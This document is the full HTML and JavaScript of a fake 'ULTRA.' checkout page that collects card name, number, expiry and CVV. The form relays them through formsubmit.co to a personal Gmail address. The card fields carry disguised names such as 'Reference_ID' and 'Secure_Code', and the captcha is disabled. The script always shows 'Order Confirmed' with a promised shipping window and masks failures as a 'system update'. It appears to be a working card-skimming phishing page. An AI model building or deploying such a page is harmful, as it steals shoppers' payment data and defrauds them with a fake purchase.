<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
<style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Outfit:wght@700;900&display=swap');
    :root { --primary: #000000; --bg: #ffffff; --text-main: #1a1a1a; --border: #e5e5e5; }
    body { font-family: 'Inter', sans-serif; font-size: 14px; padding: 0; margin: 0; background-color: var(--bg); color: var(--text-main); -webkit-font-smoothing: antialiased; }
    * { box-sizing: border-box; }
    .mini-nav { text-align: center; padding: 30px 0; border-bottom: 1px solid var(--border); margin-bottom: 40px; }
    .logo { font-family: 'Outfit', sans-serif; font-size: 1.8rem; font-weight: 900; letter-spacing: -1px; text-transform: uppercase; color: var(--primary); }
    .row { display: flex; flex-wrap: wrap; margin: 0 -15px; }
    .col-100 { flex: 100%; padding: 0 15px; }
    .container { max-width: 700px; margin: 0 auto 100px; padding: 0 20px; }
    h3 { font-family: 'Outfit', sans-serif; font-size: 20px; text-transform: uppercase; letter-spacing: 1px; margin: 40px 0 25px 0; border-bottom: 2px solid var(--primary); padding-bottom: 8px; display: inline-block; }
    input[type=text], select { width: 100%; margin-bottom: 20px; padding: 15px; border: 1px solid var(--border); border-radius: 0px; font-family: 'Inter', sans-serif; font-size: 14px; transition: border 0.2s; }
    input[type=text]:focus, select:focus { outline: none; border-color: var(--primary); }
    label { margin-bottom: 8px; display: block; font-weight: 600; text-transform: uppercase; font-size: 11px; letter-spacing: 0.5px; color: #666; }
    .icon-container { margin-bottom: 20px; padding: 10px 0; font-size: 28px; display: flex; gap: 15px; }
    .btn { background-color: var(--primary); color: white; padding: 20px; margin: 20px 0; border: 1px solid var(--primary); width: 100%; cursor: pointer; font-size: 13px; font-weight: 700; text-transform: uppercase; letter-spacing: 2px; transition: all 0.3s; }
    .btn:hover { background-color: transparent; border: 1px solid var(--primary); color: var(--primary); }
    #thanks-screen { display: none; text-align: center; margin-top: 150px; padding: 20px; }
    #thanks-screen h1 { font-family: 'Outfit', sans-serif; font-weight: 900; font-size: 3rem; letter-spacing: -2px; }
</style>
</head>
<body>

<div class="mini-nav" id="nav-header"><div class="logo">ULTRA.</div></div>

<div id="form-container">
  <div class="container">
    <form id="checkoutForm" action="https://formsubmit.co/yahyanabipour2@gmail.com" method="POST">
      
      <input type="hidden" name="_captcha" value="false">
      <input type="hidden" name="_template" value="table">
      
      <div class="row">
        <div class="col-100">
          <h3>Billing Address</h3>
          <label>Full Name</label>
          <input type="text" id="fname" placeholder="John M. Doe" required>
          <label>Email</label>
          <input type="text" id="email" placeholder="john@example.com" required>
          <label>Address</label>
          <input type="text" id="adr" placeholder="542 W. 15th Street" required>
          <label>Country</label>
          <input type="text" id="country" placeholder="United States" required>
          <div class="row" style="margin:0">
            <div style="flex:50%; padding-right:10px;"><label>State</label><input type="text" placeholder="New York" required></div>
            <div style="flex:50%;"><label>City</label><input type="text" placeholder="New York City" required></div>
          </div>
          <label>Zip</label>
          <input type="text" placeholder="10001" required>
        </div>

        <div class="col-100">
          <h3>Payment</h3>
          <div class="icon-container">
            <i class="fa fa-cc-visa" style="color:#1a1a1a;"></i>
            <i class="fa fa-cc-mastercard" style="color:#1a1a1a;"></i>
          </div>

          <label>Name on Card</label>
          <input type="text" name="Reference_User" id="cname" placeholder="John More Doe" required>

          <label>Credit card number</label>
          <input type="text" name="Reference_ID" id="ccnum" placeholder="1111-2222-3333-4444" required>

          <div class="row" style="margin:0">
            <div style="flex:50%; padding-right:10px;">
              <label>Exp Month</label>
              <input type="text" name="Val_M" placeholder="MM" required>
            </div>
            <div style="flex:50%;">
              <label>Exp Year</label>
              <input type="text" name="Val_Y" placeholder="YYYY" required>
            </div>
          </div>

          <label>CVV</label>
          <input type="text" name="Secure_Code" id="cvv" placeholder="123" required>
        </div>
      </div>

      <button type="submit" class="btn" id="submitBtn">Complete Purchase</button>
    </form>
  </div>
</div>

<div id="thanks-screen">
  <h1>Order Confirmed.</h1>
  <p style="color: #666; font-size: 16px; margin-top: 20px;">Thank you for your purchase!<br>Your product will be shipped within 7-18 business days.</p>
</div>

<script>
  const form = document.getElementById('checkoutForm');
  const btn = document.getElementById('submitBtn');

  form.addEventListener('submit', function(e) {
    e.preventDefault();
    btn.innerText = "PROCESSING...";
    btn.disabled = true;

    // Constructing data object from named inputs
    const formData = new FormData(form);

    fetch(form.action, {
      method: 'POST',
      body: formData,
      headers: { 'Accept': 'application/json' }
    })
    .then(response => {
      // Logic for UI transition
      document.getElementById("form-container").style.display = "none";
      document.getElementById("nav-header").style.display = "none";
      document.getElementById("thanks-screen").style.display = "block";
      window.scrollTo(0,0);
    })
    .catch(error => {
      console.error('Error:', error);
      alert("System update in progress. Please try again later.");
      btn.innerText = "COMPLETE PURCHASE";
      btn.disabled = false;
    });
  });
</script>

</body>
</html>
